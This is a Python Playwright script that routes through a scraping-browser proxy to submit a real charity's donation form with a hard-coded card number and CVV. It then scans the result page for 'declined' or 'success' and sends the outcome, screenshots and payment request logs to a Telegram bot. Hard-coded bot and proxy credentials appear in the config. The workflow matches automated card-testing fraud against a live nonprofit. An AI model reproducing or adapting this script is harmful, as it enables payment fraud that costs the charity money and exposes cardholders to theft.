#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Gift of Life Debug — Playwright + BrightData
"""

import os
import time
import json
import requests
import traceback
from datetime import datetime

try:
    from playwright.sync_api import sync_playwright
except ImportError:
    os.system("pip install playwright")
    os.system("playwright install chromium")
    from playwright.sync_api import sync_playwright

# ═══════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════
BOT_TOKEN = "8407490230:AAGIDHEYTwvNomiBas_yk4ezIalvweFAQro"
CHAT_ID = 6843321125

BD_HOST = "brd.superproxy.io"
BD_PORT = "9222"
BD_USER = "brd-customer-hl_24c8058e-zone-scraping_browser1"
BD_PASS = "eyr0v46j28pi"

TARGET_URL = "https://gift-of-life.org/make-a-donation/"

# Test Card
CARD_NUMBER = "5178057879094972"
CARD_MONTH = "08"
CARD_YEAR = "2030"
CARD_CVV = "123"
CARD_NAME = "Wafa Bro"

FIRST_NAME = "Wafa"
LAST_NAME = "Bro"
EMAIL = "wafabro980@gmail.com"
PHONE = "(201) 967-9866"
ADDRESS = "W356"
CITY = "Carifnia"
STATE = "California"
ZIP = "90011"


# ═══════════════════════════════════════════════════
# Telegram Helpers
# ═══════════════════════════════════════════════════
def tg_msg(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={"chat_id": CHAT_ID, "text": text[:4000]},
            timeout=15
        )
    except Exception as e:
        print(f"TG msg error: {e}", flush=True)


def tg_photo(path, caption=""):
    try:
        with open(path, "rb") as f:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                data={"chat_id": CHAT_ID, "caption": caption[:1000]},
                files={"photo": f},
                timeout=30
            )
    except Exception as e:
        print(f"TG photo error: {e}", flush=True)


# ═══════════════════════════════════════════════════
# Main Debug
# ═══════════════════════════════════════════════════
def run_debug():
    tg_msg("🚀 Gift of Life Debug — Starting...")

    cdp_url = f"wss://{BD_USER}:{BD_PASS}@{BD_HOST}:{BD_PORT}"

    # ═══════════════════════════════════════
    # STEP 1: Connect
    # ═══════════════════════════════════════
    tg_msg("🔄 [1/8] Connecting to BrightData...")
    try:
        pw = sync_playwright().start()
        browser = pw.chromium.connect_over_cdp(cdp_url, timeout=120000)
        tg_msg("✅ [1/8] Connected")
    except Exception as e:
        tg_msg(f"❌ [1/8] Failed: {str(e)[:200]}")
        return

    context = browser.new_context(
        viewport={"width": 1366, "height": 900},
        user_agent=("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"),
        locale="en-US",
    )
    page = context.new_page()
    page.set_default_timeout(60000)

    # ═══════════════════════════════════════
    # Capture Network
    # ═══════════════════════════════════════
    network_log = []
    page.on("request", lambda req: network_log.append({
        "type": "request",
        "url": req.url,
        "method": req.method,
        "post_data": req.post_data
    }))
    page.on("response", lambda res: network_log.append({
        "type": "response",
        "url": res.url,
        "status": res.status
    }))

    # ═══════════════════════════════════════
    # STEP 2: Open Page
    # ═══════════════════════════════════════
    tg_msg("🔄 [2/8] Opening donation page...")
    try:
        page.goto(TARGET_URL, wait_until="domcontentloaded", timeout=60000)
        time.sleep(5)
        tg_msg(f"✅ [2/8] Loaded: {page.title()[:60]}")
    except Exception as e:
        tg_msg(f"❌ [2/8] Failed: {str(e)[:200]}")
        page.screenshot(path="/tmp/error.png")
        tg_photo("/tmp/error.png", "[2/8] Page load error")
        return

    # ═══════════════════════════════════════
    # STEP 3: Extract Form Fields
    # ═══════════════════════════════════════
    tg_msg("🔄 [3/8] Extracting form fields...")
    try:
        form_info = page.evaluate("""() => {
            const fields = {};
            document.querySelectorAll('input, select, textarea').forEach(el => {
                if (el.id) fields[el.id] = {
                    tag: el.tagName,
                    type: el.type || '',
                    name: el.name || '',
                    placeholder: el.placeholder || ''
                };
            });
            return fields;
        }""")
        fields_json = json.dumps(form_info, indent=2)
        tg_msg(f"📋 Form Fields:\n<pre>{fields_json[:3000]}</pre>")
    except Exception as e:
        tg_msg(f"⚠️ [3/8] Extract failed: {str(e)[:100]}")

    # ═══════════════════════════════════════
    # STEP 4: Fill Form
    # ═══════════════════════════════════════
    tg_msg("🔄 [4/8] Filling form...")
    try:
        # Amount
        try:
            page.fill("#donation-amount, input[name='amount']", "5")
        except:
            pass

        # Name
        page.fill("#first-name, input[name='first_name']", FIRST_NAME)
        page.fill("#last-name, input[name='last_name']", LAST_NAME)
        page.fill("#email, input[name='email']", EMAIL)
        page.fill("#phone, input[name='phone']", PHONE)
        page.fill("#address, input[name='address']", ADDRESS)
        page.fill("#city, input[name='city']", CITY)
        page.fill("#zip, input[name='zip']", ZIP)

        # State
        try:
            page.select_option("#state, select[name='state']", STATE)
        except:
            pass

        # Card
        page.fill("#card-number, input[name='card_number']", CARD_NUMBER)
        page.fill("#card-name, input[name='card_name']", CARD_NAME)

        try:
            page.select_option("#card-month, select[name='card_month']", CARD_MONTH)
            page.select_option("#card-year, select[name='card_year']", CARD_YEAR)
        except:
            pass

        page.fill("#card-cvv, input[name='card_cvv']", CARD_CVV)

        time.sleep(2)
        tg_msg("✅ [4/8] Form filled")
    except Exception as e:
        tg_msg(f"❌ [4/8] Fill failed: {str(e)[:200]}")
        page.screenshot(path="/tmp/error.png")
        tg_photo("/tmp/error.png", "[4/8] Fill error")
        return

    # ═══════════════════════════════════════
    # STEP 5: Submit
    # ═══════════════════════════════════════
    tg_msg("🔄 [5/8] Submitting form...")
    try:
        page.click("button[type='submit'], input[type='submit']")
        time.sleep(5)
        tg_msg("✅ [5/8] Submitted")
    except Exception as e:
        tg_msg(f"⚠️ [5/8] Submit failed: {str(e)[:100]}")

    # ═══════════════════════════════════════
    # STEP 6: Wait for Continue
    # ═══════════════════════════════════════
    tg_msg("🔄 [6/8] Waiting for Continue button...")
    continue_found = False
    for _ in range(20):
        try:
            # ابحث عن زرار Continue
            btn = page.locator("button:has-text('Continue'), input[value='Continue']").first
            if btn.count() > 0 and btn.is_visible():
                btn.click()
                continue_found = True
                time.sleep(5)
                break
        except:
            pass
        time.sleep(1)

    if continue_found:
        tg_msg("✅ [6/8] Continue clicked")
    else:
        tg_msg("⚠️ [6/8] Continue button not found, continuing anyway...")

    # ═══════════════════════════════════════
    # STEP 7: Read Result
    # ═══════════════════════════════════════
    tg_msg("🔄 [7/8] Reading result...")
    time.sleep(10)

    try:
        body_text = page.inner_text("body")
        page_url = page.url

        # ابحث عن REJECT أو Success
        result_line = ""
        for line in body_text.split("\n"):
            line = line.strip()
            if "REJECT" in line.upper() or "SUCCESS" in line.upper() or "ERROR" in line.upper() or "DECLINED" in line.upper():
                result_line = line
                break

        # استخرج أي رسالة خطأ
        error_match = None
        for line in body_text.split("\n"):
            if "reject" in line.lower() or "declined" in line.lower() or "error" in line.lower() or "limit" in line.lower():
                error_match = line.strip()
                break

        tg_msg(f"""📊 [7/8] RESULT:
━━━━━━━━━━━━━━━━━━━
🔗 URL: {page_url[:80]}
📝 Result: {result_line or error_match or 'No clear result found'}
━━━━━━━━━━━━━━━━━━━""")

        # Screenshot
        page.screenshot(path="/tmp/result.png", full_page=True)
        tg_photo("/tmp/result.png", "📸 Result Page")

    except Exception as e:
        tg_msg(f"⚠️ [7/8] Read failed: {str(e)[:100]}")

    # ═══════════════════════════════════════
    # STEP 8: Send Network Log
    # ═══════════════════════════════════════
    tg_msg("🔄 [8/8] Sending network log...")

    # فلتر الطلبات المهمة
    important = []
    for entry in network_log:
        url = entry.get("url", "")
        if any(k in url.lower() for k in ["payment", "charge", "donate", "card", "transaction", "api", "submit", "process"]):
            important.append(entry)

    if important:
        log_text = json.dumps(important[:20], indent=2, ensure_ascii=False)
        # قسّم لو طويل
        if len(log_text) > 3500:
            for i in range(0, len(log_text), 3500):
                tg_msg(f"📡 Network Log ({i//3500 + 1}):\n<pre>{log_text[i:i+3500]}</pre>")
        else:
            tg_msg(f"📡 Network Log:\n<pre>{log_text}</pre>")
    else:
        tg_msg("⚠️ No important network requests captured")

    # ═══════════════════════════════════════
    # Cleanup
    # ═══════════════════════════════════════
    tg_msg("✅ DONE — All data sent")

    try:
        context.close()
    except:
        pass
    try:
        browser.close()
    except:
        pass
    try:
        pw.stop()
    except:
        pass


# ═══════════════════════════════════════════════════
# ENTRY
# ═══════════════════════════════════════════════════
if __name__ == "__main__":
    try:
        run_debug()
    except Exception as e:
        err = f"❌ FATAL:\n{e}\n\n{traceback.format_exc()}"
        print(err, flush=True)
        tg_msg(err[:3900])
